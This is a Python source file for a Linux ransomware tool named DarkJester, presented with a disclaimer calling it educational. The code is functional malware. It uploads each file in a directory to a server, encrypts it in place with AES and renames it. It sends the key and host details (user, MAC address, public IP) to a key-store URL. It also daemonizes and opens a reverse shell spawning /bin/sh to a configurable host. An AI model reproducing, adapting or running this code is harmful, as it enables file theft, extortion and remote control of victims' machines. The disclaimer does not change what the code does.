"""
________                __        ____.                __                
\______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________ 
 |    |  \\__  \\_  __ \  |/ /   |    |/ __ \ /  ___/\   __\/ __ \_  __ \
 |    `   \/ __ \|  | \/    </\__|    \  ___/ \___ \  |  | \  ___/|  | \/
/_______  (____  /__|  |__|_ \________|\___  >____  > |__|  \___  >__|   
        \/     \/           \/             \/     \/            \/       
Disclaimer: DarkJester is a powerful ransomware tool developed for educational and research purposes only. 
Unauthorized use of this software is strictly illegal and may result in criminal prosecution. 
Running or deploying DarkJester on any system without explicit permission from the system owner constitutes a violation of cybersecurity laws. 
This tool is intended solely for demonstrating security flaws and testing defenses in controlled environments. 
Always act responsibly and ethically when working with this kind tool.
"""
import os
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64
import requests
import socket
import threading
import subprocess as sp
import platform
from concurrent.futures import ThreadPoolExecutor
import re
import pty
import pwd

class DarkJester:
    def __init__(self, key_size=32, iv_size=16):
        self.key = get_random_bytes(key_size)
        self.iv = get_random_bytes(iv_size)

    def exfiltrate_file(self, filepath, server_url):
        try:
            with open(filepath, 'rb') as file:
                file_data = file.read()
                filename = os.path.basename(filepath)
                files = {'file': (filename, file_data)}
                response = requests.post(server_url, files=files)
                if response.status_code == 200:
                    print(f"[+] File {filename} exfiltrated successfully.")
                else:
                    print(f"[-] Failed to exfiltrate {filename}. Status code: {response.status_code}")
        except Exception as e:
            print(f"[-] Error exfiltrating {filepath}: {e}")
            
    def encrypt_file(self, filepath, server_url):
        try:
            if os.path.basename(filepath) in ["darkjester_encryptor_mass_linux.py", "darkjester_encryptor_mass_linux", "darkjester_encryptor_specific_testing_linux", "darkjester_encryptor_specific_testing_linux.py", "PLEASE_READ_ME.txt", "darkjester_decryptor_mass_linux.py", "darkjester_decryptor_mass_linux", "darkjester_decryptor_specific_testing_linux", "darkjester_encryptor_specific_testing_linux.py"]:
                return
            if filepath.endswith('.a1sberg'):
                return
            self.exfiltrate_file(filepath, server_url)
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            with open(filepath, 'rb') as src:
                padded_data = pad(src.read(), AES.block_size)
            with open(filepath, 'wb') as dst:
                dst.write(self.iv + cipher.encrypt(padded_data))
            new_filepath = f"{filepath}.a1sberg"
            os.rename(filepath, new_filepath)
            print(f"Encrypted: {filepath}")
        except (PermissionError, OSError) as e:
            print(f"Error encrypting {filepath}: {e}")

    def encrypt_directory(self, directory, server_url, max_threads=10):
        with ThreadPoolExecutor(max_threads) as executor:
            for root, _, files in os.walk(directory):
                for file in files:
                    filepath = os.path.join(root, file)
                    executor.submit(self.encrypt_file, filepath, server_url)
    
    def get_mac_address(self):
        result = sp.run(['ip', 'addr'], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        for line in reversed(lines):
            if "link/ether" in line:
                mac_address = line.split()[1]
                return mac_address
        return "N/A"

    def get_public_ip(self):
        try:
            return requests.get('https://api.ipify.org').text.strip()
        except requests.RequestException as e:
            return "N/A"

    def get_system_info(self):
        try:
            os_name = platform.system()
            hostname = socket.gethostname()
            user = pwd.getpwuid(os.getuid())[0]
            architecture = os.uname()[4]
            mac_address = self.get_mac_address()
            external_ip = self.get_public_ip()
            return {
                "Operating System": os_name,
                "Hostname": hostname,
                "User": user,
                "Architecture": architecture,
                "MAC Address": mac_address,
                "External IP": external_ip
            }
        except Exception as e:
            pass

    def exfiltrate_key(self, server_url):
        encoded_key = base64.b64encode(self.key).decode()
        system_info = self.get_system_info()
        payload = {
            "key": encoded_key,
            "system_info": system_info
        }
        try:
            requests.post(server_url, json=payload, headers={'Content-Type': 'application/json'})
        except requests.RequestException as e:
            print(f"Error exfiltrating key: {e}")

class ReverseShell:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def daemonize(self):
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        os.chdir("/")
        os.setsid()
        os.umask(0)
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        sys.stdout.flush()
        sys.stderr.flush()
        with open("/dev/null", 'r') as null_file:
            os.dup2(null_file.fileno(), sys.stdin.fileno())
        with open("/dev/null", 'a+') as null_file:
            os.dup2(null_file.fileno(), sys.stdout.fileno())
            os.dup2(null_file.fileno(), sys.stderr.fileno())

    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/sh")

if __name__ == "__main__":
    jester = DarkJester()
    shell = ReverseShell('127.0.0.1', 1234) # Modify this
    server_url = "http://127.0.0.1:5000/upload" # Modify this
    shell.daemonize()
    jester.encrypt_directory("path/to/directory", server_url, max_threads=30) # Modify this, adjust thread if needed
    jester.exfiltrate_key("http://127.0.0.1:5000/store-key") # Modify this
    shell.start()


